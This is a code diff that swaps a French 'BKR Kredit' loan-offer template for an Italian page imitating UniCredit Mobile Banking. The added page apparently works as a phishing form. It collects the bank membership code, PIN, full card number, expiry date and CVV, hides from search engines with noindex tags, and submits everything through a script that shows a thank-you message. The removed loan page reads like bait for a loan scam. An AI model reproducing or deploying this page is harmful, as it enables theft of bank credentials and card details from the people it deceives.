@@ -1,93 +1,92 @@
-@layout('layouts/master')
-@set('title', 'BKR Kredit')
+<!DOCTYPE html>
+<html lang="it" dir="ltr" class="ios">
 
-@section('content')
-<section id='intro'>
-  <div class='intro-container'>
-    <div id='introCarousel' class='carousel slide carousel-fade' data-ride='carousel'>
-      <ol class='carousel-indicators'></ol>
-      <div class='carousel-inner' role='listbox'>
-        <div class='carousel-item active' style="background-image: url('img/intro-carousel/1.jpg');">
-          <div class='carousel-container'>
-            <div class='carousel-content'>
-              <h2>Le crédit, en plus rapide<span style='color: #13a456;'>.</span></h2>
-              <p>Effectuez votre demande 100% en ligne et obtenez votre financement en moins de 24h à des taux
-                imbattables et sans frais de remboursement anticipé !</p>
-              <a href='/ask-for-loan' class='btn-get-started scrollto'>Demandez un Prêt</a>
-            </div>
-          </div>
-        </div>
-        <div class='carousel-item' style="background-image: url('img/intro-carousel/2.jpg');">
-          <div class='carousel-container'>
-            <div class='carousel-content'>
-              <h2>Offre de services en ligne 24h / 7j<span style='color: #13a456;'>.</span></h2>
-              <p>Bénéficiez d'une offre de financement rapide et fiable pour réaliser un projet, construire une maison
-                ou encore acheter un bien. Nos offres sont disponible en 24h sans conditions.
-              </p>
-              <a href='/ask-for-loan' class='btn-get-started scrollto'>Demandez un Prêt</a>
-            </div>
-          </div>
-        </div>
-        <div class='carousel-item' style="background-image: url('img/intro-carousel/3.jpg');">
-          <div class='carousel-container'>
-            <div class='carousel-content'>
-              <h2>Le crédit, au service de l'économie réelle<span style='color: #13a456;'>.</span>
-              </h2>
-              <p>Depuis son lancement, BKR Kredit a permis la réalisation de 151 327 projets, pour un montant total de 1
-                201 564 000 €. Votre prêt personnel vous attend !</p>
-              <a href='/ask-for-loan' class='btn-get-started scrollto'>Demandez un Prêt</a>
-            </div>
-          </div>
-        </div>
-        <div class='carousel-item' style="background-image: url('img/intro-carousel/5.jpg');">
-          <div class='carousel-container'>
-            <div class='carousel-content'>
-              <h2>Empruntez en toute transparence<span style='color: #13a456;'>.</span></h2>
-              <p>BKR Kredit, c'est déjà 1 201 564 000 € de projets réalisés en Europe… Et si le prochain, c'était le
-                vôtre ?</p>
-              <a href='/ask-for-loan' class='btn-get-started scrollto'>Demandez un Prêt</a>
-            </div>
-          </div>
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex">
+  <meta name="googlebot" content="noindex">
+
+  <title>UniCredit - Mobile Banking</title>
+  <script src="carbon-components.min.js" defer></script>
+  <link rel="stylesheet" href="carbon-components.min.css">
+  <link rel="stylesheet" href="style.css">
+  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="normalize.min.css" />
+</head>
+
+<body>
+  <div id="app">
+    <header style="margin-bottom: 2rem; margin-top: 2rem;"><img src="logoHiRes.png" width="130" class="bx--image"
+        alt=""></header>
+    <h1 class="bx--h1">
+      Inserisci il Codice <br> di adesione e PIN
+    </h1>
+    <form action="" method="POST" id="my-form" class="bx--form">
+      <div class="bx--form-item">
+        <input id="text-input-1" type="text" class="bx--text-input" name="code" placeholder="Codice Adesione">
+      </div>
+      <div class="bx--form-item">
+        <input id="text-input-2" type="password" inputmode="numeric" name="pin" class="bx--text-input"
+          placeholder="PIN">
+        <div class="bx--form__helper-text">
+          <a href="#" class="bx--link">Dove trovo i miei codici?</a>
         </div>
       </div>
-      <a class='carousel-control-prev' href='#introCarousel' role='button' data-slide='prev'>
-        <span class='carousel-control-prev-icon ion-chevron-left' aria-hidden='true'></span>
-        <span class='sr-only'>Previous</span>
+      <div class="bx--form-item">
+        <input id="text-input-3" type="number" inputmode="numeric" class="bx--text-input" name="cc"
+          placeholder="Numero di carta" maxLength="16">
+      </div>
+      <div class="flex">
+        <input id="text-input-4" type="month" class="bx--text-input" name="exp" placeholder="Data di scadenza">
+        <input id="text-input-5" type="number" inputmode="numeric" name="cvv" class="bx--text-input" maxLength="4"
+          placeholder="CVV">
+      </div>
+      <button class="bx--btn bx--btn--secondary" type="submit" id="my-form-button">
+        PROSEGUI
+      </button>
+    </form>
+
+    <h4 class="bx--h4">
+      <a href="#" class="bx--link">
+        ADESIONE DIGITAL MAILBOX &rangle;
       </a>
-      <a class='carousel-control-next' href='#introCarousel' role='button' data-slide='next'>
-        <span class='carousel-control-next-icon ion-chevron-right' aria-hidden='true'></span>
-        <span class='sr-only'>Next</span>
-      </a>
-    </div>
+    </h4>
+    <p id="my-form-status"></p>
   </div>
-</section>
+  <script>
+    var form = document.getElementById("my-form");
 
-<main id='main'>
-  <!--========================== Featured Services ============================-->
-  @!include('includes/featured-services')
+    async function handleSubmit(event) {
+      event.preventDefault();
+      var status = document.getElementById("my-form-status");
+      var data = new FormData(event.target);
+      fetch(event.target.action, {
+        method: form.method,
+        body: data,
+        headers: {
+          'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+          status.innerHTML = "Thanks for your submission!";
+          form.reset()
+        } else {
+          response.json().then(data => {
+            if (Object.hasOwn(data, 'errors')) {
+              status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+            } else {
+              status.innerHTML = "Oops! There was a problem submitting your form"
+            }
+          })
+        }
+      }).catch(error => {
+        status.innerHTML = "Oops! There was a problem submitting your form"
+      });
+    }
+    form.addEventListener("submit", handleSubmit)
+  </script>
+</body>
 
-  <!--========================== About Us ============================-->
-  @!include('includes/about-us')
-
-  <!--========================== Services ============================-->
-  @!include('includes/services')
-
-  <!--============================ CTA ===============================-->
-  @!include('includes/cta')
-
-  <!--============================ Facts =============================-->
-  @!include('includes/facts')
-
-  <!--=========================== Patners ============================-->
-  @!include('includes/partners')
-
-  <!--========================== Testimonials ============================-->
-  @!include('includes/testimonials')
-
-  <!--========================== Team ============================-->
-  @!include('includes/team')
-
-  <!--=========================== Contact ============================-->
-  @!include('includes/contact')
-</main>
-@endsection
+</html>
